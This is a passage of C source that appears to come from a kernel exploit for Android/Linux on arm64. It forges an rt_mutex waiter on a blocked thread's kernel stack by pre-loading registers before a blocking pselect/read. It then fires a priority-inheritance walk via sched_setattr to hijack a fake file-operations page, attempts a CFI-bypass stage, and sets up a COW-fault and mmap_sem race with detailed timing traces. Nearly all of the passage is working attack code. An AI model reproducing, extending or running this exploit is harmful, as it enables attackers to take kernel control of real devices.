 * timeout. The consumer's sched_setattr fires the walk while blocked. */

int overlay_block_pipe[2] = {-1, -1};

extern long overlay_pselect_asm(uint64_t lock, uint64_t task, uint64_t prio,
                                int nfds, void *readfds, void *timeout);

static long overlay_pselect_block(uint64_t w_lock, uint64_t w_task,
                                  uint64_t w_prio) {
  int rfd = overlay_block_pipe[0];
  if (rfd < 0) return -1;

  int local_fd = (int)syscall(SYS_dup3, rfd, 5, O_CLOEXEC);
  if (local_fd < 0) {
    local_fd = (int)syscall(SYS_dup, rfd);
    if (local_fd < 0) return -2;
  }

  fd_set rfds;
  FD_ZERO(&rfds);
  FD_SET(local_fd, &rfds);
  int nfds = local_fd + 1;

  struct timespec timeout = { .tv_sec = 5, .tv_nsec = 0 };
  {
    char m[96];
    int n = snprintf(m, sizeof(m), "[OVERLAY] pselect fd=%d nfds=%d\n",
                     local_fd, nfds);
    syscall(SYS_write, 2, m, n);
  }

  long ret = overlay_pselect_asm(w_lock, w_task, w_prio,
                                  nfds, &rfds, &timeout);

  if (local_fd != rfd) syscall(SYS_close, local_fd);
  return ret;
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);

    /* Arm the consumer BEFORE entering the blocking pselect. The consumer
     * waits for punch_consume_go != 0, then fires sched_setattr after
     * main_route_delay_usec. The delay gives the pselect time to enter
     * the kernel and reach the blocking point in poll_schedule_timeout
     * before the walk reads the waiter fields. */
    atomic_store(&main_route_delay_usec, 100000);
    atomic_store(&punch_consume_go, route_attempt);

    {
      static const char m[] = "[OVERLAY] read register-coloring block\n";
      syscall(SYS_write, 2, m, sizeof(m) - 1);
    }

    /* THE OVERLAY: read() with callee-saved registers pre-loaded.
     * ksys_read (frame 0x50) saves registers at the waiter positions:
     *   x20 -> SP0-0x160 = W.lock = fake_lock
     *   x21 -> SP0-0x168 = W.task = fake_task
     *   x19 -> SP0-0x158 = W.prio = 1
     *   x29 -> SP0-0x190 = W.tree_entry.right = 0
     *   x30 -> SP0-0x188 = W.tree_entry.left = 0
     *   x24/x23/x22 -> pi_tree = {0,0,0}
     *
     * tree_entry.pc at SP0-0x198 is BELOW ksys_read's frame. It gets
     * whatever the __arm64_sys_read stub writes there (fp or canary).
     * We need it to be 0 for BLACK root. The stub saves fp+lr at
     * [sp, #-0x10]! which is SP0-0x150..SP0-0x140 (above tree_entry).
     * Actually SP0-0x198 is in the gap between pt_regs and ksys_read.
     * Whatever was there before (from the el0_svc entry path) stays.
     *
     * read() on the empty pipe blocks in pipe_read -> schedule().
     * Deep blocking: el1_irq from ~SP0-0x300+ never reaches SP0-0x160.
     * Consumer writes 1 byte to unblock after the walk completes. */
    uint64_t spray_prio = getenv("PRIO_MATCH") ? 127 : 1;
    long psel_ret = 0;
    if (getenv("OLD_SPRAY")) {
      spray_waiter_via_setsockopt();
      atomic_store(&punch_consume_go, route_attempt);
      route_spin_userspace();
    } else {
      psel_ret = overlay_pselect_block(
          (uint64_t)fake_lock, (uint64_t)fake_task, spray_prio);
    }

    atomic_store(&punch_consume_go, 0);

    /* Sanitize pi_blocked_on IMMEDIATELY: any sched_setattr from another
     * process (e.g. AMS lifecycle management on our threads) after the
     * pselect returns would walk the stale pi_blocked_on against garbage
     * stack data. The sanitize does FUTEX_LOCK_PI + FUTEX_UNLOCK_PI
     * which makes remove_waiter() NULL out current->pi_blocked_on. */
    route_pi_sanitize();

    pr_info("overlay pselect ret=%ld attempt=%d page=%016zx "
            "lock=%016zx w0=%016zx task=%016zx fops=%016zx "
            "misc_fops=%016zx\n",
            psel_ret, route_attempt, page_base,
            fake_lock, fake_w0, fake_task, fake_fops,
            (uint64_t)canon_addr(ASHMEM_MISC_FOPS));

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("route walk attempt=%d/%d calls=%d success=%d walk_us=%d\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success,
            atomic_load(&consumer_walk_us));
    (void)route_payload_canary();

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      int probe_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      pr_info("fops probe: open fd=%d errno=%d\n", probe_fd, errno);
      if (probe_fd >= 0)
        close(probe_fd);

      if (skip_cfi_stage) {
        route_verified = 1;
        cfi_last_step = 0;
        pr_info("skip_cfi_stage: accepting route as verified\n");
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else {
      cfi_last_step = 33;
      cfi_last_errno = 0;
    }

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; "
             "refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

/* READINESS SPRAY + COW-FAULT BLOCKER
 *
 * pselect6 first copies the write-fd bitmap from a prefaulted MAP_PRIVATE
 * file mapping, computes the readiness result into its on-stack fdsets, then
 * copies the result back to the same mapping. The first copy is a read and
 * succeeds through the existing read-only file PTE. The result copy is a
 * write, so it takes a COW fault.
 *
 * A helper thread holds mm->mmap_sem while mprotect() walks a large set of
 * prefaulted read-only PTEs. The mapping remains a single VMA: unlike the
 * first VMA-forest prototype, this does not churn mm->map_count (which can
 * alias an unreclaimed mm_struct in a missed slab reclaim). The COW fault
 * sleeps while core_sys_select's deep frame is live, so schedule frames grow
 * below the reclaimed waiter. */

extern long readiness_pselect_asm(int nfds, fd_set *readfds,
                                  fd_set *writefds, fd_set *exceptfds);

#define READINESS_PTE_MB_DEFAULT 2048
#define READINESS_PTE_MB_MAX 16384
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
#define READINESS_LOCK_HEADSTART_USEC 50
#else
#define READINESS_LOCK_HEADSTART_USEC 100
#endif

struct readiness_cow_ctx {
  void *region;
  size_t region_len;
  atomic_int start;
  atomic_int entered;
  atomic_int tid;
  atomic_int abort;
  atomic_int release_mprotect;
  atomic_int mprotect_started;
  atomic_int stop_mprotect;
  atomic_int done;
  int ret;
  int err;
  unsigned long iterations;
  long long elapsed_us;
};

static long long readiness_now_us(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (long long)ts.tv_sec * 1000000LL + ts.tv_nsec / 1000;
}

#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
#define READINESS_TRACE_CAP 16
#define READINESS_MPROTECT_TRACE_CAP 128
enum readiness_trace_event {
  READINESS_TRACE_MPROTECT_BEFORE = 1,
  READINESS_TRACE_MPROTECT_AFTER,
  READINESS_TRACE_MONITOR_ARMED,
  READINESS_TRACE_MONITOR_FIRST_STATE,
  READINESS_TRACE_MONITOR_BLOCKED,
  READINESS_TRACE_PSELECT_BEFORE,
  READINESS_TRACE_PSELECT_AFTER,
  READINESS_TRACE_COW_ENTERED,
  READINESS_TRACE_TRIGGER_GATE_OPEN,
  READINESS_TRACE_POST_GATE_RUNNABLE,
  READINESS_TRACE_MONITOR_POST_PSELECT,
};

struct readiness_trace_entry {
  long long at_us;
  int event;
  int value;
};

static struct readiness_trace_entry readiness_trace[READINESS_TRACE_CAP];
static atomic_int readiness_trace_count;

struct readiness_mprotect_trace_entry {
  long long at_us;
  unsigned long call_index;
  int entering;
  int restore;
  int prot;
  int ret;
  int err;
};

static struct readiness_mprotect_trace_entry
    readiness_mprotect_trace[READINESS_MPROTECT_TRACE_CAP];
static atomic_int readiness_mprotect_trace_count;

static void readiness_trace_reset(void) {
  atomic_store(&readiness_trace_count, 0);
  atomic_store(&readiness_mprotect_trace_count, 0);
}

static void readiness_trace_mark(int event, int value) {
  int slot = atomic_fetch_add(&readiness_trace_count, 1);
  if (slot < READINESS_TRACE_CAP) {
    readiness_trace[slot].at_us = readiness_now_us();
    readiness_trace[slot].event = event;
    readiness_trace[slot].value = value;
  }
}

static void readiness_trace_flush(int route_attempt) {
  int count = atomic_load(&readiness_trace_count);
  if (count > READINESS_TRACE_CAP)
    count = READINESS_TRACE_CAP;
  for (int i = 0; i < count; i++) {
    struct readiness_trace_entry entry = readiness_trace[i];
    pr_info("COWTRACE attempt=%d event=%d at_us=%lld value=%d\n",
            route_attempt, entry.event, entry.at_us, entry.value);
  }
}

static void readiness_mprotect_trace_mark(long long at_us,
                                           unsigned long call_index,
                                           int entering, int restore,
                                           int prot, int ret, int err) {
  int slot = atomic_fetch_add(&readiness_mprotect_trace_count, 1);
  if (slot < READINESS_MPROTECT_TRACE_CAP) {
    struct readiness_mprotect_trace_entry *entry =
        &readiness_mprotect_trace[slot];
    entry->at_us = at_us;
    entry->call_index = call_index;
    entry->entering = entering;
    entry->restore = restore;
    entry->prot = prot;
    entry->ret = ret;
    entry->err = err;
  }
}

static int readiness_traced_mprotect(void *address, size_t length, int prot,
                                     unsigned long call_index, int restore,
                                     int *err_out) {
  errno = 0;
  long long entered_us = readiness_now_us();
  readiness_mprotect_trace_mark(entered_us, call_index, 1, restore, prot, 0,
                                0);
  int ret = mprotect(address, length, prot);
  int err = ret == 0 ? 0 : errno;
  long long returned_us = readiness_now_us();
  readiness_mprotect_trace_mark(returned_us, call_index, 0, restore, prot,
                                ret, err);
  *err_out = err;
  return ret;
}

static void readiness_mprotect_trace_flush(int route_attempt) {
  int count = atomic_load(&readiness_mprotect_trace_count);
  int truncated = count > READINESS_MPROTECT_TRACE_CAP;
  if (truncated)
    count = READINESS_MPROTECT_TRACE_CAP;
  pr_info("MPTIME attempt=%d events=%d capacity=%d truncated=%d\n",
          route_attempt, count, READINESS_MPROTECT_TRACE_CAP, truncated);
  for (int i = 0; i < count; i++) {
    struct readiness_mprotect_trace_entry entry =
        readiness_mprotect_trace[i];
    pr_info("MPTIME attempt=%d call=%lu phase=%s kind=%s prot=%d ret=%d "
            "errno=%d at_us=%lld\n",
            route_attempt, entry.call_index,
            entry.entering ? "enter" : "return",
            entry.restore ? "restore" : "loop", entry.prot, entry.ret,
            entry.err, entry.at_us);
  }
}

static void readiness_log_cow_pagemap(const char *phase, int ret, int err,
                                      unsigned long long entry) {
  pr_info("readiness COW pagemap phase=%s result=%d errno=%d "
          "entry=%016llx present=%d file=%d exclusive=%d soft_dirty=%d\n",
          phase, ret, err, entry, (int)((entry >> 63) & 1ULL),
          (int)((entry >> 61) & 1ULL), (int)((entry >> 56) & 1ULL),
          (int)((entry >> 55) & 1ULL));
}
#endif

static size_t readiness_pte_mb(void) {
  const char *value = getenv("READINESS_PTE_MB");
  if (!value || !*value)
    return READINESS_PTE_MB_DEFAULT;

  char *end = NULL;
  errno = 0;
  unsigned long mb = strtoul(value, &end, 0);
  if (errno || end == value || *end || mb < 64 || mb > READINESS_PTE_MB_MAX)
    return READINESS_PTE_MB_DEFAULT;
  return (size_t)mb;
}

static int readiness_prepare_pte_region(struct readiness_cow_ctx *ctx) {
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  ctx->region_len = readiness_pte_mb() * 1024UL * 1024UL;
  ctx->region = mmap(NULL, ctx->region_len, PROT_READ,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
  if (ctx->region == MAP_FAILED) {
    ctx->region = NULL;
    return 0;
  }
#ifdef MADV_NOHUGEPAGE
  (void)madvise(ctx->region, ctx->region_len, MADV_NOHUGEPAGE);
#endif

  /* Read faults map the shared zero page: this installs ordinary PTEs and
   * page tables without allocating region_len bytes of physical memory. */
  unsigned long prefault = 0;
  for (size_t off = 0; off < ctx->region_len; off += page_size)
    prefault += *(volatile unsigned char *)((char *)ctx->region + off);
  __asm__ volatile("" : : "r"(prefault) : "memory");
  return 1;
}

#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
static unsigned long long readiness_affinity_mask64(const cpu_set_t *mask) {
  unsigned long long bits = 0;
  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
    if (CPU_ISSET(cpu, mask))
      bits |= 1ULL << cpu;
  }
  return bits;
}
#endif

#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
static int readiness_select_passive_helper_core(const cpu_set_t *allowed,
                                                int waiter_core) {
#if defined(RMG_DIAG_PASSIVE_COW_HELPER_CORE) && \
    RMG_DIAG_PASSIVE_COW_HELPER_CORE >= 0
  int preferred = RMG_DIAG_PASSIVE_COW_HELPER_CORE;
  if (preferred < CPU_SETSIZE && preferred != waiter_core &&
      CPU_ISSET(preferred, allowed))
    return preferred;
#endif
  for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--) {
    if (cpu != waiter_core && CPU_ISSET(cpu, allowed))
      return cpu;
  }
  return -1;
}

static int readiness_pin_passive_observer(
    int waiter_core, int *observer_core, int *helper_core,
    unsigned long long *inherited_bits, unsigned long long *allowed_bits,
    unsigned long long *effective_bits) {
  cpu_set_t inherited, all_cpus, allowed, requested, effective;
  CPU_ZERO(&inherited);
  memset(&all_cpus, 0xff, sizeof(all_cpus));
  CPU_ZERO(&allowed);
  CPU_ZERO(&requested);
  CPU_ZERO(&effective);
  *observer_core = -1;
  *helper_core = -1;
  *inherited_bits = 0;
  *allowed_bits = 0;
  *effective_bits = 0;

  if (waiter_core < 0) {
    errno = EINVAL;
    return -1;
  }

  if (sched_getaffinity(0, sizeof(inherited), &inherited) != 0)
    return -1;
  *inherited_bits = readiness_affinity_mask64(&inherited);

  /* pthread_create inherited the waiter's CPU-6 mask. Widen only this
   * monitor thread so we can discover its cpuset, then keep it off both the
   * waiter and the selected COW mmap helper CPU. */
  if (sched_setaffinity(0, sizeof(all_cpus), &all_cpus) != 0)
    return -1;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) != 0)
    return -1;
  *allowed_bits = readiness_affinity_mask64(&allowed);

  *helper_core = readiness_select_passive_helper_core(&allowed,
                                                       waiter_core);
  if (*helper_core < 0) {
    errno = ENODEV;
    return -1;
  }

  int last_errno = ENODEV;
  for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
    if (cpu == waiter_core || cpu == *helper_core ||
        !CPU_ISSET(cpu, &allowed))
      continue;
    CPU_ZERO(&requested);
    CPU_SET(cpu, &requested);
    if (sched_setaffinity(0, sizeof(requested), &requested) != 0) {
      last_errno = errno;
      continue;
    }
    if (sched_getaffinity(0, sizeof(effective), &effective) != 0) {
      last_errno = errno;
      continue;
    }
    int effective_count = 0;
    for (int check = 0; check < CPU_SETSIZE; check++)
      effective_count += CPU_ISSET(check, &effective) ? 1 : 0;
    if (effective_count == 1 && CPU_ISSET(cpu, &effective) &&
        sched_getcpu() == cpu) {
      *observer_core = cpu;
      *effective_bits = readiness_affinity_mask64(&effective);
      return 0;
    }
    last_errno = EINVAL;
  }
  errno = last_errno;
  return -1;
}
#endif

static void *readiness_mmap_lock_thread(void *arg) {
  struct readiness_cow_ctx *ctx = arg;
  disable_rseq_for_thread();
  atomic_store_explicit(&ctx->tid, (int)syscall(SYS_gettid),
                        memory_order_release);
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
  int waiter_core = atomic_load(&route_waiter_core);
  cpu_set_t inherited_mask, restore_mask, restored_mask;
  memset(&inherited_mask, 0, sizeof(inherited_mask));
  memset(&restore_mask, 0xff, sizeof(restore_mask));
  memset(&restored_mask, 0, sizeof(restored_mask));
  int inherited_ret = sched_getaffinity(0, sizeof(inherited_mask),
                                        &inherited_mask);
  int inherited_errno = inherited_ret == 0 ? 0 : errno;
  errno = 0;
  int restore_ret = sched_setaffinity(0, sizeof(restore_mask),
                                      &restore_mask);
  int restore_errno = restore_ret == 0 ? 0 : errno;
  int restored_ret = sched_getaffinity(0, sizeof(restored_mask),
                                       &restored_mask);
  unsigned long long restored_bits = restored_ret == 0
      ? readiness_affinity_mask64(&restored_mask) : 0;
  int locker_core = -1;
  if (restore_ret == 0) {
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && \
    RMG_DIAG_PASSIVE_COW_OBSERVER
    cpu_set_t allowed_mask;
    CPU_ZERO(&allowed_mask);
    if (sched_getaffinity(0, sizeof(allowed_mask), &allowed_mask) == 0) {
      int preferred_core = readiness_select_passive_helper_core(
          &allowed_mask, waiter_core);
      if (preferred_core >= 0 && sched_pin_core(preferred_core) == 0)
        locker_core = preferred_core;
    }
#endif
    if (locker_core < 0)
      locker_core = sched_pin_highest_allowed(waiter_core);
  }
  pr_info("readiness mmap locker affinity inherited=%016llx/%d "
          "restore=%d/%d allowed=%016llx/%d core=%d waiter_core=%d\n",
          inherited_ret == 0
              ? readiness_affinity_mask64(&inherited_mask) : 0,
          inherited_errno, restore_ret, restore_errno, restored_bits,
          restored_ret, locker_core, waiter_core);
#else
  pin_to_core_ex(CORE > 0 ? CORE - 1 : CORE,
                 atomic_load(&route_waiter_core));
#endif

  while (!atomic_load_explicit(&ctx->start, memory_order_acquire))
    __asm__ volatile("yield" ::: "memory");

  atomic_store_explicit(&ctx->entered, 1, memory_order_release);
  if (atomic_load_explicit(&ctx->abort, memory_order_acquire))
    return NULL;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
  while (!atomic_load_explicit(&ctx->release_mprotect,
                               memory_order_acquire))
    __asm__ volatile("yield" ::: "memory");
#if defined(RMG_DIAG_COW_MPROTECT_DELAY_USEC) && \
    RMG_DIAG_COW_MPROTECT_DELAY_USEC > 0
  long long release_us = readiness_now_us();
  long long delay_until_us =
      release_us + RMG_DIAG_COW_MPROTECT_DELAY_USEC;
  while (readiness_now_us() < delay_until_us)
    __asm__ volatile("yield" ::: "memory");
#endif
#endif
  long long start_us = readiness_now_us();
  errno = 0;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
  readiness_trace_mark(READINESS_TRACE_MPROTECT_BEFORE, 0);
  atomic_store_explicit(&ctx->mprotect_started, 1, memory_order_release);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-mprotect-start", ctx->region_len,
                      syscall(SYS_gettid));
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
  unsigned long mprotect_call_index = 0;
  int prot = PROT_READ;
  ctx->ret = 0;
  ctx->err = 0;
  do {
    prot = prot == PROT_READ ? PROT_NONE : PROT_READ;
    ctx->ret = readiness_traced_mprotect(
        ctx->region, ctx->region_len, prot, ++mprotect_call_index, 0,
        &ctx->err);
    if (ctx->ret != 0)
      break;
    ctx->iterations++;
  } while (!atomic_load_explicit(&ctx->stop_mprotect,
                                 memory_order_acquire));
  /* Leave the private diagnostic mapping readable before it is unmapped. */
  if (ctx->ret == 0 && prot == PROT_NONE) {
    ctx->ret = readiness_traced_mprotect(
        ctx->region, ctx->region_len, PROT_READ, ++mprotect_call_index, 1,
        &ctx->err);
  }
#else
  ctx->ret = mprotect(ctx->region, ctx->region_len, PROT_NONE);
  ctx->err = errno;
#endif
  ctx->elapsed_us = readiness_now_us() - start_us;
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
  readiness_trace_mark(READINESS_TRACE_MPROTECT_AFTER, ctx->ret);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-mprotect-done",
                      (unsigned long long)ctx->ret, ctx->err);
  rmg_diag_checkpoint("readiness-mprotect-time",
                      (unsigned long long)ctx->elapsed_us,
                      ctx->region_len);
#endif
  pr_info("readiness mmap locker result=%d errno=%d iterations=%lu "
          "elapsed_us=%lld\n", ctx->ret, ctx->err, ctx->iterations,
          ctx->elapsed_us);
  atomic_store_explicit(&ctx->done, 1, memory_order_release);
  return NULL;
}

static fd_set *readiness_map_cow_fdset(const fd_set *source, int *fd_out,
                                       size_t *map_len_out) {
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  int fd = (int)syscall(SYS_memfd_create, "readiness-fdset", MFD_CLOEXEC);
  if (fd < 0)
    return NULL;
  if (ftruncate(fd, (off_t)page_size) != 0 ||
      pwrite(fd, source, sizeof(*source), 0) != (ssize_t)sizeof(*source)) {
    close(fd);
    return NULL;
  }

  fd_set *mapping = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE, fd, 0);
  if (mapping == MAP_FAILED) {
    close(fd);
    return NULL;
  }

  /* Install a readable file PTE without taking the private write fault. */
  volatile unsigned long prefault = *(volatile unsigned long *)mapping;
  __asm__ volatile("" : : "r"(prefault) : "memory");

  *fd_out = fd;
  *map_len_out = page_size;
  return mapping;
}

#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
static int readiness_clear_soft_dirty(void) {
  int fd = open("/proc/self/clear_refs", O_WRONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  ssize_t written = write(fd, "4", 1);
  int saved_errno = errno;
  close(fd);
  if (written != 1) {
    errno = written < 0 ? saved_errno : EIO;
    return -1;
  }
  return 0;
}

static int readiness_read_pagemap_entry(const void *address,
                                        unsigned long long *entry_out) {
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  if (!page_size) {
    errno = EINVAL;
    return -1;
  }
  int fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return -1;
  off_t offset = (off_t)((uintptr_t)address / page_size) *
                 (off_t)sizeof(*entry_out);
  unsigned long long entry = 0;
  ssize_t got = pread(fd, &entry, sizeof(entry), offset);
  int saved_errno = errno;
  close(fd);
  if (got != (ssize_t)sizeof(entry)) {
    errno = got < 0 ? saved_errno : EIO;
    return -1;
  }
  *entry_out = entry;
  return 0;
}

struct readiness_smaps_snapshot {
  int ret;
  int err;
  unsigned long long anonymous_kb;
  unsigned long long private_dirty_kb;
};

static void readiness_read_smaps(const void *address,
                                 struct readiness_smaps_snapshot *snapshot) {
  snapshot->ret = -1;
  snapshot->err = 0;
  int fd = open("/proc/self/smaps", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    snapshot->err = errno;
    return;
  }
  FILE *smaps = fdopen(fd, "r");
  if (!smaps) {
    snapshot->err = errno;
    close(fd);
    return;
  }

  uintptr_t target = (uintptr_t)address;
  int in_target_vma = 0;
  int saw_anonymous = 0;
  int saw_private_dirty = 0;
  char line[256];
  while (fgets(line, sizeof(line), smaps)) {
    unsigned long long start = 0, end = 0;
    if (sscanf(line, "%llx-%llx", &start, &end) == 2) {
      if (in_target_vma)
        break;
      in_target_vma = target >= (uintptr_t)start &&
                      target < (uintptr_t)end;
      continue;
    }
    if (!in_target_vma)
      continue;

    unsigned long long value = 0;
    if (sscanf(line, "Anonymous: %llu kB", &value) == 1) {
      snapshot->anonymous_kb = value;
      saw_anonymous = 1;
    } else if (sscanf(line, "Private_Dirty: %llu kB", &value) == 1) {
      snapshot->private_dirty_kb = value;
      saw_private_dirty = 1;
    }
    if (saw_anonymous && saw_private_dirty) {
      snapshot->ret = 0;
      break;
    }
  }
  if (snapshot->ret != 0)
    snapshot->err = ferror(smaps) ? errno : ENODATA;
  fclose(smaps);
}

struct readiness_anon_soft_dirty_probe {
  int map_ret;
  int map_errno;
  int clear_ret;
  int clear_errno;
  int before_ret;
  int before_errno;
  unsigned long long before_entry;
  int write_ret;
  int after_ret;
  int after_errno;
  unsigned long long after_entry;
};

static void readiness_probe_anon_soft_dirty(
    struct readiness_anon_soft_dirty_probe *probe) {
  probe->map_ret = -1;
  probe->clear_ret = -1;
  probe->before_ret = -1;
  probe->write_ret = -1;
  probe->after_ret = -1;
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  if (!page_size) {
    probe->map_errno = EINVAL;
    return;
  }

  volatile unsigned char *page = mmap(NULL, page_size,
      PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (page == MAP_FAILED) {
    probe->map_errno = errno;
    return;
  }
  probe->map_ret = 0;

  /* Fault in the page before clearing soft-dirty, then test a known write. */
  *page = 0x41;
  __asm__ volatile("" : : "r"(*page) : "memory");
  errno = 0;
  probe->clear_ret = readiness_clear_soft_dirty();
  probe->clear_errno = probe->clear_ret == 0 ? 0 : errno;
  errno = 0;
  probe->before_ret = readiness_read_pagemap_entry(
      (const void *)page, &probe->before_entry);
  probe->before_errno = probe->before_ret == 0 ? 0 : errno;

  *page = 0x42;
  probe->write_ret = 0;
  errno = 0;
  probe->after_ret = readiness_read_pagemap_entry(
      (const void *)page, &probe->after_entry);
  probe->after_errno = probe->after_ret == 0 ? 0 : errno;
  munmap((void *)page, page_size);
}
#endif

#if defined(RMG_DIAG_READINESS_STATE_TRACE)
#define READINESS_MONITOR_STATE_TRACE_CAP 32
struct readiness_monitor_state_event {
  long long at_us;
  unsigned long long polls;
  int tid;
  int target;
  int state;
  int gate;
  int pselect_active;
  int observer_cpu;
};
#endif

#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
#define READINESS_SCHEDSTAT_TRACE_CAP 64
struct readiness_schedstat_sample {
  unsigned long long runtime_ns;
  unsigned long long runqueue_wait_ns;
  unsigned long long timeslices;
  unsigned long long polls;
  long long at_us;
  int observer_cpu;
  int pselect_active;
  char task_state;
};

struct readiness_schedstat_trace {
  int open_errno;
  int last_read_errno;
  unsigned long long samples;
  unsigned long long read_errors;
  unsigned int stored;
  unsigned int truncated;
  struct readiness_schedstat_sample events[READINESS_SCHEDSTAT_TRACE_CAP];
};
#endif

struct readiness_block_monitor {
  int tid;
  int seq;
  atomic_int ready;
  atomic_int armed;
  atomic_int trigger_gate;
  atomic_int runnable_after_gate;
  atomic_int pselect_active;
  atomic_int pre_gate_block;
  atomic_int sample_ready;
  atomic_int stop;
  atomic_int saw_block;
  int open_errno;
  long sched_ret;
  int sched_errno;
  unsigned long long polls;
  unsigned long long blocked_samples;
  int post_pselect_block;
  unsigned long long post_pselect_block_polls;
  int first_state;
  int last_state;
#if defined(RMG_DIAG_LIVE_WCHAN_TRACE) && RMG_DIAG_LIVE_WCHAN_TRACE
  int live_d_wchan_captured;
#endif
#if defined(RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE) && \
    RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE
  int live_d_helper_syscall_captured;
#endif
#if defined(RMG_DIAG_LIVE_HELPER_WCHAN_TRACE) && \
    RMG_DIAG_LIVE_HELPER_WCHAN_TRACE
  int live_d_helper_wchan_captured;
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
  atomic_int locker_tid;
  atomic_int locker_stat_ready;
  int locker_stat_fd;
  int locker_open_errno;
  unsigned long long locker_polls;
  unsigned long long locker_blocked_samples;
  int locker_first_state;
  int locker_last_state;
  int locker_block_seen;
  int locker_block_state;
  int locker_block_gate;
  int locker_block_pselect_active;
  int locker_block_wchan_errno;
  unsigned long long locker_block_polls;
  long long locker_block_at_us;
  char locker_block_wchan[128];
#endif
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
  atomic_int helper_stat_ready;
  int helper_tid;
  int helper_stat_fd;
  int helper_open_errno;
  unsigned long long helper_polls;
  unsigned long long helper_blocked_samples;
  int helper_first_state;
  int helper_last_state;
#endif
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
  int observer_affinity_errno;
  int observer_core;
  int helper_core;
  unsigned long long observer_inherited_affinity;
  unsigned long long observer_allowed_affinity;
  unsigned long long observer_effective_affinity;
  unsigned long long pselect_state_samples;
  int pselect_first_state;
  int pselect_last_state;
  long long pselect_first_sample_us;
  long long pselect_last_sample_us;
  int pselect_first_observer_cpu;
  int pselect_last_observer_cpu;
#endif
#if defined(RMG_DIAG_READINESS_STATE_TRACE)
  struct readiness_monitor_state_event
      state_trace[READINESS_MONITOR_STATE_TRACE_CAP];
  atomic_int state_trace_count;
#endif
#if defined(RMG_DIAG_SCHEDSTAT_TRACE) && RMG_DIAG_SCHEDSTAT_TRACE
  struct readiness_schedstat_trace waiter_schedstat;
#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
  struct readiness_schedstat_trace helper_schedstat;
#endif
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
  int block_seen;
  int block_state;
  int block_gate;
  int block_runnable_after_gate;
  int block_pselect_started;
  int block_pselect_active_at_state;
  int block_pselect_active_after_state;
  int block_pselect_active_after_wchan;
  int block_wchan_errno;
  int block_wchan_state_after;
  long long block_wchan_elapsed_us;
  unsigned long long block_polls;
  long long block_at_us;
  unsigned long long runnable_after_gate_polls;
  char block_wchan[128];
  atomic_int pselect_call_started;
#endif
};

